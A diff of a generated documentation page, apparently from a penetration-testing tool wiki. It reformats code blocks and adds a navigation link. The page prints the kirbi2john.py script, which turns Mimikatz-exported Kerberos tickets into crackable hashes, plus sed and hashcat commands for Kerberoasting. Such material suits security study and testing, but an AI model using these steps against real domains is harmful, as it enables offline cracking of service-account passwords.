@@ -685,6 +685,8 @@
       
         
       
+        
+      
     
     
     
@@ -767,6 +769,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17015,67 +17038,117 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h2 id="installation">Installation</h2>
 <p>At: <a href="https://github.com/nidem/kerberoast/blob/master/kirbi2john.py">https://github.com/nidem/kerberoast/blob/master/kirbi2john.py</a>.</p>
 <p>Being the following script:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>#!/usr/bin/env -S python3 -tt
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a># Based on the Kerberoast script from Tim Medin to extract the Kerberos tickets
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a># from a kirbi file.
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a># Modification to parse them into the JTR-format by Michael Kramer (SySS GmbH)
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a># Copyright [2015] [Tim Medin, Michael Kramer]
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>#
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a># you may not use this file except in compliance with the License.
-</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a># You may obtain a copy of the License at
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>#
-</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>#    http://www.apache.org/licenses/LICENSE-2.0
-</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>#
-</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a># Unless required by applicable law or agreed to in writing, software
-</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
-</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a># See the License for the specific language governing permissions and
-</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a># limitations under the License
-</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>
-</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>from pyasn1.codec.ber import encoder, decoder
-</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>import glob
-</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>import kerberos
-</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>
-</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>
-</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>if __name__ == &#39;__main__&#39;:
-</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>    import argparse
-</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>    import sys
-</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>
-</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>    parser = argparse.ArgumentParser(description=&#39;Read Mimikatz kerberos ticket then modify it and save it in crack_file&#39;)
-</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>    parser.add_argument(&#39;-o&#39;, dest=&#39;crack_file&#39;, metavar=&#39;crack_file&#39;, type=argparse.FileType(&#39;w&#39;), default=sys.stdout, nargs=&#39;?&#39;,
-</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>                    help=&#39;File to save crackable output to (default is stdout&#39;)
-</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>    parser.add_argument(&#39;files&#39;, nargs=&#39;+&#39;, metavar=&#39;file.kirbi&#39;, type=str,
-</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>                    help=&#39;File name to crack. Use asterisk \&#39;*\&#39; for many files.\n Files are exported with mimikatz or from extracttgsrepfrompcap.py&#39;)
-</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>
-</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>    args = parser.parse_args()
-</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>
-</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>    enctickets = []
-</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>
-</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>    for path in args.files:
-</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a>        for filename in glob.glob(path):
-</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a>            et = kerberos.extract_ticket_from_kirbi(filename)
-</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a>            if et:
-</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>                enctickets.append((et,filename))
-</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>
-</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a>    #out=open(&quot;crack_file&quot;,&quot;wb&quot;)
-</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a>    for et in enctickets:
-</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a>        filename = et[1].split(&#39;/&#39;)[-1].split(&#39;\\&#39;)[-1].replace(&#39;.kirbi&#39;,&#39;&#39;)
-</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a>
-</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a>        out = &#39;$krb5tgs$23$*&#39; + filename + &#39;*$&#39; + et[0][:16].hex() + &#39;$&#39; +et[0][16:].hex() + &#39;\n&#39;
-</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a>
-</span><span id="__span-0-50"><a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a>        args.crack_file.writelines(out)
-</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a>    sys.stderr.write(&#39;tickets written: &#39; + str(len(enctickets)) + &#39;\n&#39;)
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-0-10">10</a></span>
+<span class="normal"><a href="#__codelineno-0-11">11</a></span>
+<span class="normal"><a href="#__codelineno-0-12">12</a></span>
+<span class="normal"><a href="#__codelineno-0-13">13</a></span>
+<span class="normal"><a href="#__codelineno-0-14">14</a></span>
+<span class="normal"><a href="#__codelineno-0-15">15</a></span>
+<span class="normal"><a href="#__codelineno-0-16">16</a></span>
+<span class="normal"><a href="#__codelineno-0-17">17</a></span>
+<span class="normal"><a href="#__codelineno-0-18">18</a></span>
+<span class="normal"><a href="#__codelineno-0-19">19</a></span>
+<span class="normal"><a href="#__codelineno-0-20">20</a></span>
+<span class="normal"><a href="#__codelineno-0-21">21</a></span>
+<span class="normal"><a href="#__codelineno-0-22">22</a></span>
+<span class="normal"><a href="#__codelineno-0-23">23</a></span>
+<span class="normal"><a href="#__codelineno-0-24">24</a></span>
+<span class="normal"><a href="#__codelineno-0-25">25</a></span>
+<span class="normal"><a href="#__codelineno-0-26">26</a></span>
+<span class="normal"><a href="#__codelineno-0-27">27</a></span>
+<span class="normal"><a href="#__codelineno-0-28">28</a></span>
+<span class="normal"><a href="#__codelineno-0-29">29</a></span>
+<span class="normal"><a href="#__codelineno-0-30">30</a></span>
+<span class="normal"><a href="#__codelineno-0-31">31</a></span>
+<span class="normal"><a href="#__codelineno-0-32">32</a></span>
+<span class="normal"><a href="#__codelineno-0-33">33</a></span>
+<span class="normal"><a href="#__codelineno-0-34">34</a></span>
+<span class="normal"><a href="#__codelineno-0-35">35</a></span>
+<span class="normal"><a href="#__codelineno-0-36">36</a></span>
+<span class="normal"><a href="#__codelineno-0-37">37</a></span>
+<span class="normal"><a href="#__codelineno-0-38">38</a></span>
+<span class="normal"><a href="#__codelineno-0-39">39</a></span>
+<span class="normal"><a href="#__codelineno-0-40">40</a></span>
+<span class="normal"><a href="#__codelineno-0-41">41</a></span>
+<span class="normal"><a href="#__codelineno-0-42">42</a></span>
+<span class="normal"><a href="#__codelineno-0-43">43</a></span>
+<span class="normal"><a href="#__codelineno-0-44">44</a></span>
+<span class="normal"><a href="#__codelineno-0-45">45</a></span>
+<span class="normal"><a href="#__codelineno-0-46">46</a></span>
+<span class="normal"><a href="#__codelineno-0-47">47</a></span>
+<span class="normal"><a href="#__codelineno-0-48">48</a></span>
+<span class="normal"><a href="#__codelineno-0-49">49</a></span>
+<span class="normal"><a href="#__codelineno-0-50">50</a></span>
+<span class="normal"><a href="#__codelineno-0-51">51</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>#!/usr/bin/env -S python3 -tt
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a># Based on the Kerberoast script from Tim Medin to extract the Kerberos tickets
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a># from a kirbi file.
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a># Modification to parse them into the JTR-format by Michael Kramer (SySS GmbH)
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a># Copyright [2015] [Tim Medin, Michael Kramer]
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a>#
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a># you may not use this file except in compliance with the License.
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a># You may obtain a copy of the License at
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a>#
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11"></a>#    http://www.apache.org/licenses/LICENSE-2.0
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12"></a>#
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13"></a># Unless required by applicable law or agreed to in writing, software
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14"></a># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15"></a># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16"></a># See the License for the specific language governing permissions and
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17"></a># limitations under the License
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18"></a>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19"></a>from pyasn1.codec.ber import encoder, decoder
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20"></a>import glob
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21"></a>import kerberos
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22"></a>
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23"></a>
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24"></a>if __name__ == &#39;__main__&#39;:
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25"></a>    import argparse
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26"></a>    import sys
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27"></a>
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28"></a>    parser = argparse.ArgumentParser(description=&#39;Read Mimikatz kerberos ticket then modify it and save it in crack_file&#39;)
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29"></a>    parser.add_argument(&#39;-o&#39;, dest=&#39;crack_file&#39;, metavar=&#39;crack_file&#39;, type=argparse.FileType(&#39;w&#39;), default=sys.stdout, nargs=&#39;?&#39;,
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30"></a>                    help=&#39;File to save crackable output to (default is stdout&#39;)
+</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31"></a>    parser.add_argument(&#39;files&#39;, nargs=&#39;+&#39;, metavar=&#39;file.kirbi&#39;, type=str,
+</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32"></a>                    help=&#39;File name to crack. Use asterisk \&#39;*\&#39; for many files.\n Files are exported with mimikatz or from extracttgsrepfrompcap.py&#39;)
+</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33"></a>
+</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34"></a>    args = parser.parse_args()
+</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35"></a>
+</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36"></a>    enctickets = []
+</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37"></a>
+</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38"></a>    for path in args.files:
+</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39"></a>        for filename in glob.glob(path):
+</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40"></a>            et = kerberos.extract_ticket_from_kirbi(filename)
+</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41"></a>            if et:
+</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42"></a>                enctickets.append((et,filename))
+</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43"></a>
+</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44"></a>    #out=open(&quot;crack_file&quot;,&quot;wb&quot;)
+</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45"></a>    for et in enctickets:
+</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46"></a>        filename = et[1].split(&#39;/&#39;)[-1].split(&#39;\\&#39;)[-1].replace(&#39;.kirbi&#39;,&#39;&#39;)
+</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47"></a>
+</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48"></a>        out = &#39;$krb5tgs$23$*&#39; + filename + &#39;*$&#39; + et[0][:16].hex() + &#39;$&#39; +et[0][16:].hex() + &#39;\n&#39;
+</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49"></a>
+</span><span id="__span-0-50"><a id="__codelineno-0-50" name="__codelineno-0-50"></a>        args.crack_file.writelines(out)
+</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51"></a>    sys.stderr.write(&#39;tickets written: &#39; + str(len(enctickets)) + &#39;\n&#39;)
+</span></code></pre></div></td></tr></table></div>
 <h2 id="basic-usage">Basic usage</h2>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="go">python2.7 kirbi2john.py Filename.kirbi</span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="go">python2.7 kirbi2john.py Filename.kirbi</span>
+</span></code></pre></div></td></tr></table></div>
 <p>This will create a file called <code>crack_file</code>. We then must modify the file a bit to be able to use Hashcat against the hash.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="go">sed &#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#39; crack_file &gt; ServiceName_tgs_hashcat</span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="go">sed &#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#39; crack_file &gt; ServiceName_tgs_hashcat</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Cracking the Hash with Hashcat</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="go">hashcat -m 13100 ServiceName_tgs_hashcat /usr/share/wordlists/rockyou.txt </span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="go">hashcat -m 13100 ServiceName_tgs_hashcat /usr/share/wordlists/rockyou.txt </span>
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
@@ -17151,7 +17224,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
